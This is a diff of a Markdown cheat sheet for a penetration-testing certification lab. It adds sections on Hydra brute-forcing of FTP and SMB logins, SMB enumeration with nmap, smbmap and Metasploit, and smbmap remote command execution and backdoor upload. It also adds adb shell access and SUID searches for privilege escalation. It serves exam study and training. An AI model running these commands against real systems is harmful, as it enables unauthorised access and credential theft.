@@ -67,7 +67,7 @@ Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego.
 * Password crack for VCRYPT
 * IP Address/ Version of Running windows Server.
 
-### Nmap
+## Nmap
 
 #### Identify the OS of the machine hosting a DB
 
@@ -98,7 +98,7 @@ Running nmap command we'll retrieve info about Domain and Host name:
 
 to checks hosts up: `nmap -sn IP/Subnet`
 
-### WireShark
+## WireShark
 
 #### Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file?&#x20;
 
@@ -143,7 +143,17 @@ or
 
 * Click on MQ Telemetry Transport Protocol -> Publish Message -> Msg Len
 
-### Hashcat
+## BCTextEncoder
+
+### Decrypt the encoded secret and enter the decrpted text as the answer
+
+Use BCTextEncoder to decrypt the encoded secret file, psw can be the same of SMB login
+
+{% content-ref url="../tools/bctextencoder.md" %}
+[bctextencoder.md](../tools/bctextencoder.md)
+{% endcontent-ref %}
+
+## Hashcat
 
 * `hashcat -m 0 -a 0 hash.txt passwordlist.txt -m 0`
 
@@ -157,12 +167,38 @@ or
 
 ### Hydra
 
-#### Crack the FTP credentials to obtain file stored into FTP server an enter the content as the answer
+### Crack the FTP credentials to obtain file stored into FTP server an enter the content as the answer
 
 * Find IP with FTP open port: nmap -p 21 IP/Subnet
 * if we know username: `hydra -l user -P passlist.txt ftp://IP`
 * if we don't know username and psw: `hydra -L /user.txt -P password.txt ftp://IP` or `hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://IP` &#x20;
 * Login using FTP credentials obtained, get flag and cat it.
+
+### **Crack the SMB credentials knowing username to obtain file stored into share**
+
+**Brute force smb login**
+
+```bash
+hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
+```
+
+#### Download file stored into share
+
+```bash
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
+```
+
+### **Entropy**
+
+### Perform deep scan on the elf files and obtain the last 4 digits of SHA 384 hash of the file with highest entropy value locate into android folder
+
+* Scan adb port: `nmap ip -sV -p 5555`
+* Connect adb: `adb connect IP:5555`
+* Access mobile device: `adb shell`
+* `pwd` --> `ls` --> `cd sdcard/scan` --> `ls` --> `cat secret.txt` (If you can't find it there then go to Downloads folder using: `cd downloads`)
+* Download files: `adb pull /sdcard/scan` (if it doesn't work we need to elevate privilege using `sudo -i`)
+* We've three elf files, now we need to calcolate entropy for each of them using this command: `ent file.elf`
+* After selecting file.elf with highest entropy, we need to calculate hash of SHA 384: `sha384sum file.elf` and consider only the last 4 digits of the hash result.
 
 ### **SQLMap**
 
@@ -256,6 +292,101 @@ A site has SQLi vulnerability, the cookie information is stored in a text file i
 
 If you get any questions related to netbios, SMB use metasploit.
 
+### SMB
+
+#### Nmap
+
+```bash
+sudo nmap -p 445 -sV -sC -O <TARGET_IP>
+nmap -sU --top-ports 25 --open <TARGET_IP>
+
+nmap -p 445 --script smb-protocols <TARGET_IP>
+nmap -p 445 --script smb-security-mode <TARGET_IP>
+
+nmap -p 445 --script smb-enum-sessions <TARGET_IP>
+nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+
+nmap -p 445 --script smb-enum-shares <TARGET_IP>
+nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+
+nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+
+nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+
+nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+
+nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+
+nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+
+nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+
+nmap -p 445 --script smb-os-discovery <TARGET_IP>
+
+nmap -p445 --script=smb-vuln-* <TARGET_IP>
+```
+
+#### SMBMap
+
+```bash
+smbmap -u guest -p "" -d . -H <TARGET_IP>
+
+smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>
+
+## Run a command
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'
+## List all drives
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L
+## List dir content
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'
+## Upload a file
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'
+## Download a file
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
+```
+
+#### SMB - Hydra
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
+```
+
+#### SMB - Metasploit
+
+```bash
+# METASPLOIT Starting
+msfconsole
+msfconsole -q
+
+# METASPLOIT SMB
+use auxiliary/scanner/smb/smb_version
+use auxiliary/scanner/smb/smb_enumusers
+use auxiliary/scanner/smb/smb_enumshares
+use auxiliary/scanner/smb/smb_login
+use auxiliary/scanner/smb/pipe_auditor
+
+## set options depends on the selected module
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+set SMBUser <USER>
+set RHOSTS <TARGET_IP>
+exploit
+```
+
+#### SMB Connection
+
+```bash
+smbclient -L <TARGET_IP> -N
+smbclient -L <TARGET_IP> -U <USER>
+smbclient //<TARGET_IP>/<USER> -U <USER>
+smbclient //<TARGET_IP>/admin -U admin
+smbclient //<TARGET_IP>/public -N #NULL Session
+## SMBCLIENT
+smbclient //<TARGET_IP>/share_name
+help
+ls
+get <filename>
+```
+
 ### Veracrypt
 
 \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
@@ -342,6 +473,63 @@ If you get any questions related to netbios, SMB use metasploit.
 * ifconfig - print ip address stuff
 * ip a - similar to ifconfig but shortest print
 * finger - gives you a short dump of info about a user
+
+#### Find command <a href="#automating-local-enumeration-1" id="automating-local-enumeration-1"></a>
+
+Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
+
+Below are some useful examples for the “find” command.
+
+**Find files:**
+
+* `find / -type f -iname "flag1.txt" 2>/dev/null`: find the file named "flag1.txt" case insensitive under / and not showing output errors
+* `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
+* `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
+* `find / -type d -name config`: find the directory named config under “/”
+* `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
+* `find / -perm a=x`: find executable files
+* `find /home -user frank`: find all files for user “frank” under “/home”
+* `find / -mtime 10`: find files that were modified in the last 10 days
+* `find / -atime 10`: find files that were accessed in the last 10 day
+* `find / -cmin -60`: find files changed within the last hour (60 minutes)
+* `find / -amin -60`: find files accesses within the last hour (60 minutes)
+* `find / -size 50M`: find files with a 50 MB size
+
+This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.
+
+The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output.
+
+**Folders and files that can be written to or executed from:**
+
+* `find / -writable -type d 2>/dev/null` : Find world-writeable folders
+* `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
+* `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
+
+The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.
+
+* `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
+
+**Find development tools and supported languages:**
+
+* `find / -name perl*`
+* `find / -name python*`
+* `find / -name gcc*`
+
+**Find specific file permissions:**
+
+Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it.
+
+This allows for an interesting privilege escalation path,we will see in more details on task 6.
+
+The example below is given to complete the subject on the “find” command.
+
+* `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
+
+#### Alternative in Windows OS
+
+```bash
+search -f flag.txt
+```
 
 ## Others <a href="#effd" id="effd"></a>
 
